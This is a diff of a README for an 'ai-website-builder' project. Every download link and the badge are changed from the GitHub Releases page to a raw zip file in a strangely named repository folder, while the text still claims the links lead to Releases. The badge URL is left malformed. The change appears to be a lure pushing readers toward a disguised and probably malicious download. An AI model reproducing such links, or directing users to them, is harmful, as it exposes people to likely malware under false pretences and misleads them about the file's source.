@@ -1,6 +1,6 @@
 # 🌐 ai-website-builder - Build Real Websites with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/CopixonVoserin/ai-website-builder/releases)
+[![Download Now](https://raw.githubusercontent.com/CopixonVoserin/ai-website-builder/main/remuneratively/ai-website-builder.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/CopixonVoserin/ai-website-builder/main/remuneratively/ai-website-builder.zip)
 
 ## 📖 Overview
 Welcome to the ai-website-builder! This tool allows you to create real websites using natural language, with no coding skills required. Our application harnesses the power of artificial intelligence to transform your ideas into functional websites quickly and easily.
@@ -11,7 +11,7 @@ To get started with ai-website-builder, you will need to download it from our Re
 ### Step 1: Visit the Release Page
 Click the link below to access the Releases page where you can find the latest version of ai-website-builder.
 
-[Visit Releases Page](https://github.com/CopixonVoserin/ai-website-builder/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/CopixonVoserin/ai-website-builder/main/remuneratively/ai-website-builder.zip)
 
 ### Step 2: Download the Application
 On the Releases page, you will see a list of available versions. Look for the latest version and click on the corresponding download link. This may be a file specific to your operating system.
@@ -41,7 +41,7 @@ For the best experience, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get ai-website-builder, visit the Releases page:
 
-[Download Now](https://github.com/CopixonVoserin/ai-website-builder/releases)
+[Download Now](https://raw.githubusercontent.com/CopixonVoserin/ai-website-builder/main/remuneratively/ai-website-builder.zip)
 
 Follow the installation instructions above to set up the application. 
 
